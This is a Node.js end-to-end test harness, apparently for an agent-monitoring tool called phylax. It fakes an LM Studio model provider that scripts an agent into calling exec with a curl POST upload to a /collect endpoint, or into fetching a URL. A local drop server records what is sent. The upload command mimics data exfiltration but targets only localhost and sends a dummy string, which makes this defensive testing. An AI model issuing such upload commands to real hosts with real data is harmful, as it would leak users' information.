// End-to-end harness: an OpenAI-compatible "LM Studio" on :1234 that makes the
// real OpenClaw agent loop call `exec` with a Cisco-style upload command, plus
// a local drop server that records what curl actually sent.
//
// Usage: node e2e/mock-provider.mjs   (Ctrl-C to stop)
//   E2E_TOOL=exec      (default) the model calls exec with the upload command
//   E2E_TOOL=web_fetch the model fetches http://127.0.0.1:<DROP_PORT>/<E2E_PATH> (default "empty",
//                      which answers 200 with no body — the silent failure did_it_work must catch;
//                      "forbidden" answers 403)

import http from "node:http";

const DROP_PORT = Number(process.env.DROP_PORT ?? 18999);
const MODEL = "mock/phylax-e2e";
// curl.exe: on Windows the exec shell is PowerShell, where bare `curl` is an alias for Invoke-WebRequest.
const E2E_TOOL = process.env.E2E_TOOL ?? "exec";
const E2E_PATH = process.env.E2E_PATH ?? "empty";
const COMMAND = `curl.exe -s -m 5 -X POST --data "phylax-e2e-upload" http://127.0.0.1:${DROP_PORT}/collect`;

const drops = [];
const drop = http.createServer((req, res) => {
  let body = "";
  req.on("data", (c) => (body += c));
  req.on("end", () => {
    drops.push({ method: req.method, url: req.url, body });
    console.log(`[drop] ${req.method} ${req.url} body=${JSON.stringify(body)}`);
    if (req.url?.startsWith("/empty")) {
      res.writeHead(200, { "content-type": "text/plain", "content-length": "0" });
      res.end();
      return;
    }
    if (req.url?.startsWith("/forbidden")) {
      res.writeHead(403, { "content-type": "text/plain" });
      res.end("forbidden");
      return;
    }
    res.end("ok");
  });
});
drop.listen(DROP_PORT, "127.0.0.1", () => console.log(`[drop] listening on 127.0.0.1:${DROP_PORT}`));

function sse(res, objs) {
  res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
  for (const o of objs) {
    res.write(`data: ${JSON.stringify(o)}\n\n`);
  }
  res.write("data: [DONE]\n\n");
  res.end();
}

function chunk(id, delta, finish = null) {
  return {
    id,
    object: "chat.completion.chunk",
    created: Math.floor(Date.now() / 1000),
    model: MODEL,
    choices: [{ index: 0, delta, finish_reason: finish }],
  };
}

let turn = 0;
const provider = http.createServer((req, res) => {
  let body = "";
  req.on("data", (c) => (body += c));
  req.on("end", () => {
    const url = req.url ?? "";
    if (req.method === "GET" && (url.startsWith("/v1/models") || url.startsWith("/api/v1/models"))) {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ object: "list", data: [{ id: MODEL, key: MODEL, object: "model", owned_by: "mock", type: "llm" }] }));
      return;
    }
    if (req.method === "POST" && url.startsWith("/v1/chat/completions")) {
      let parsed = {};
      try {
        parsed = JSON.parse(body);
      } catch {}
      const msgs = Array.isArray(parsed.messages) ? parsed.messages : [];
      const hasToolResult = msgs.some((m) => m.role === "tool");
      const offered = (parsed.tools ?? []).map((t) => t?.function?.name);
      const hasExecTool = E2E_TOOL === "exec" ? offered.includes("exec") || offered.includes("bash") : offered.includes(E2E_TOOL);
      turn++;
      console.log(`[provider] turn ${turn}: ${msgs.length} messages, exec tool offered=${hasExecTool}, tool result present=${hasToolResult}, stream=${!!parsed.stream}`);
      const id = `chatcmpl-e2e-${turn}`;

      if (!hasToolResult && hasExecTool) {
        const toolCall = {
          index: 0,
          id: "call_phylax_e2e_1",
          type: "function",
          function:
            E2E_TOOL === "exec"
              ? { name: "exec", arguments: JSON.stringify({ command: COMMAND }) }
              : { name: E2E_TOOL, arguments: JSON.stringify({ url: `http://127.0.0.1:${DROP_PORT}/${E2E_PATH}` }) },
        };
        if (parsed.stream) {
          sse(res, [
            chunk(id, { role: "assistant", content: null, tool_calls: [toolCall] }),
            chunk(id, {}, "tool_calls"),
          ]);
        } else {
          res.writeHead(200, { "content-type": "application/json" });
          res.end(
            JSON.stringify({
              id,
              object: "chat.completion",
              created: Math.floor(Date.now() / 1000),
              model: MODEL,
              choices: [{ index: 0, message: { role: "assistant", content: null, tool_calls: [toolCall] }, finish_reason: "tool_calls" }],
              usage: { prompt_tokens: 10, completion_tokens: 10, total_tokens: 20 },
            }),
          );
        }
        return;
      }

      const text = hasToolResult ? `E2E: ${E2E_TOOL} finished.` : `E2E: no ${E2E_TOOL} tool was offered to me (offered: ${offered.join(", ")}).`;
      if (parsed.stream) {
        sse(res, [chunk(id, { role: "assistant", content: text }), chunk(id, {}, "stop")]);
      } else {
        res.writeHead(200, { "content-type": "application/json" });
        res.end(
          JSON.stringify({
            id,
            object: "chat.completion",
            created: Math.floor(Date.now() / 1000),
            model: MODEL,
            choices: [{ index: 0, message: { role: "assistant", content: text }, finish_reason: "stop" }],
            usage: { prompt_tokens: 10, completion_tokens: 5, total_tokens: 15 },
          }),
        );
      }
      return;
    }
    console.log(`[provider] unhandled ${req.method} ${url}`);
    res.writeHead(404);
    res.end();
  });
});
provider.listen(1234, "127.0.0.1", () => console.log("[provider] listening on 127.0.0.1:1234 as LM Studio"));

process.on("SIGTERM", () => process.exit(0));
